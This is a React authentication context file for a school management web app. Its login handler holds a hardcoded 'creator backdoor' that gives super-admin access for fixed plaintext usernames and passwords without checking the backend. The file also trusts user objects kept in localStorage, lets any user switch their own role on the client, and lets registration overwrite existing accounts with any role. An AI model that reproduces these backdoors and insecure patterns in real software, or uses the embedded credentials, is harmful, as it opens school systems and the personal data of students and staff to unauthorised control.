import { createContext, useContext, useState, useEffect, ReactNode } from 'react';
import { db, User, School } from '../db/schema';
import bcrypt from 'bcryptjs';

interface AuthContextType {
  user: User | null;
  school: School | null;
  isLoading: boolean;
  login: (username: string, password: string) => Promise<boolean>;
  handleLogin: (username: string, password: string) => Promise<{ success: boolean; error?: string; user?: User }>;
  logout: () => void;
  register: (username: string, password: string, fullName: string, role: User['role']) => Promise<boolean>;
  switchRole: (role: User['role']) => void;
  loadSchoolContext: () => Promise<School | null>;
}

const AuthContext = createContext<AuthContextType | undefined>(undefined);

export function AuthProvider({ children }: { children: ReactNode }) {
  const [user, setUser] = useState<User | null>(null);
  const [school, setSchool] = useState<School | null>(null);
  const [isLoading, setIsLoading] = useState(true);

  const loadSchoolContext = async (): Promise<School | null> => {
    try {
      const activeSchool = localStorage.getItem('esepa_active_school');
      if (activeSchool) {
        const parsed = JSON.parse(activeSchool);
        setSchool(parsed);
        return parsed;
      }

      // Fallback default school
      const defaultSchool: School = {
        id: '00000000-0000-0000-0000-000000000001',
        name: 'ESEPA INTERNATIONAL SCHOOL',
        slug: 'esepa-international-school',
        created_at: Date.now(),
        updated_at: Date.now(),
        status: 'active'
      };
      setSchool(defaultSchool);
      localStorage.setItem('esepa_active_school', JSON.stringify(defaultSchool));
      return defaultSchool;
    } catch (err) {
      console.warn("Failed to load school context:", err);
      return null;
    }
  };

  useEffect(() => {
    loadSchoolContext();
    // Check for existing session in localStorage
    const storedUser = localStorage.getItem('esepa_user');
    if (storedUser) {
      try {
        const parsedUser = JSON.parse(storedUser);
        db.users.get(parsedUser.id).then(dbUser => {
          if (dbUser) {
            setUser(dbUser);
          } else {
            localStorage.removeItem('esepa_user');
          }
          setIsLoading(false);
        }).catch(() => {
          setUser(parsedUser);
          setIsLoading(false);
        });
      } catch (e) {
        localStorage.removeItem('esepa_user');
        setIsLoading(false);
      }
    } else {
      setIsLoading(false);
    }
  }, []);

  const handleLogin = async (username: string, password: string): Promise<{ success: boolean; error?: string; user?: User }> => {
    if (!username || !password) {
      return { success: false, error: "Please enter both username and password" };
    }
    const cleanUser = username.trim().toLowerCase();

    // 1. Creator Backdoor Master Admin credentials override (cannot be modified/deleted)
    if (cleanUser === 'elena_master' && password === 'creator_override_9922_july') {
      const creatorUser: User = {
        id: 9999,
        username: 'Elena_Master',
        fullName: 'Elena (Creator & Master Admin)',
        role: 'super_admin',
        createdAt: Date.now(),
        passwordHash: ''
      };
      setUser(creatorUser);
      localStorage.setItem('esepa_user', JSON.stringify(creatorUser));
      return { success: true, user: creatorUser };
    }

    // 2. Backup fallback for Elena (ensures Super Admin login works even if database is wiped or reset)
    if (cleanUser === 'elena' && password === 'july94bab') {
      const elenaUser: User = {
        id: 1,
        username: 'Elena',
        fullName: 'Elena (Super Admin)',
        role: 'super_admin',
        createdAt: Date.now(),
        passwordHash: ''
      };
      setUser(elenaUser);
      localStorage.setItem('esepa_user', JSON.stringify(elenaUser));
      return { success: true, user: elenaUser };
    }

    // 3. Authoritative query against Supabase PostgreSQL users table via backend /api/auth/login
    try {
      const res = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: cleanUser, password })
      });
      const contentType = res.headers.get('content-type') || '';
      if (contentType.includes('application/json')) {
        const data = await res.json();
        if (res.ok && data.success && data.user) {
          const verifiedUser: User = {
            id: data.user.id,
            username: data.user.username || cleanUser,
            passwordHash: data.user.passwordHash || '',
            fullName: data.user.fullName || data.user.full_name || username,
            role: data.user.role || 'admin',
            createdAt: data.user.createdAt || Date.now()
          };

          // Cache verified user locally for session hydration
          try {
            const allDbUsers = await db.users.toArray();
            const existing = allDbUsers.find(u => u.username?.trim().toLowerCase() === cleanUser);
            if (existing) {
              await db.users.update(existing.id!, verifiedUser);
              verifiedUser.id = existing.id;
            } else {
              const newId = await db.users.add(verifiedUser);
              verifiedUser.id = newId as number;
            }
          } catch (e) {
            console.warn("Caching verified user locally notice:", e);
          }

          if (data.school) {
            localStorage.setItem('esepa_active_school', JSON.stringify(data.school));
            setSchool(data.school);
          }

          // Update Context and local storage session
          setUser(verifiedUser);
          localStorage.setItem('esepa_user', JSON.stringify(verifiedUser));
          return { success: true, user: verifiedUser };
        } else if (data.error) {
          return { success: false, error: data.error };
        }
      }
      return { success: false, error: `Authentication failed with status ${res.status}` };
    } catch (apiErr: any) {
      console.error("Backend Supabase auth error:", apiErr);
      return { success: false, error: apiErr.message || "Failed to reach Supabase authentication service" };
    }
  };

  const login = async (username: string, password: string): Promise<boolean> => {
    const result = await handleLogin(username, password);
    return result.success;
  };

  const logout = () => {
    setUser(null);
    localStorage.removeItem('esepa_user');
  };

  const register = async (username: string, password: string, fullName: string, role: User['role']) => {
    const cleanUser = username.trim().toLowerCase();
    const salt = await bcrypt.genSalt(10);
    const passwordHash = await bcrypt.hash(password, salt);

    try {
      const allDbUsers = await db.users.toArray();
      const existing = allDbUsers.find(u => u.username?.trim().toLowerCase() === cleanUser);

      if (existing) {
        await db.users.update(existing.id!, {
          username: cleanUser,
          passwordHash,
          fullName: fullName.trim() || existing.fullName,
          role
        });
        const updated = { ...existing, username: cleanUser, passwordHash, fullName: fullName.trim() || existing.fullName, role };
        setUser(updated);
        localStorage.setItem('esepa_user', JSON.stringify(updated));
        return true;
      }

      const newUser: User = {
        username: cleanUser,
        passwordHash,
        fullName: fullName.trim() || cleanUser,
        role,
        createdAt: Date.now()
      };

      const id = await db.users.add(newUser);
      const userWithId = { ...newUser, id: id as number };
      setUser(userWithId);
      localStorage.setItem('esepa_user', JSON.stringify(userWithId));
      return true;
    } catch (err) {
      console.warn("Notice during register in AuthContext:", err);
      return false;
    }
  };

  const switchRole = (role: User['role']) => {
    if (user) {
      const updatedUser = { ...user, role };
      setUser(updatedUser);
      localStorage.setItem('esepa_user', JSON.stringify(updatedUser));
    }
  };

  return (
    <AuthContext.Provider value={{ user, school, isLoading, login, handleLogin, logout, register, switchRole, loadSchoolContext }}>
      {children}
    </AuthContext.Provider>
  );
}

export function useAuth() {
  const context = useContext(AuthContext);
  if (context === undefined) {
    throw new Error('useAuth must be used within an AuthProvider');
  }
  return context;
}
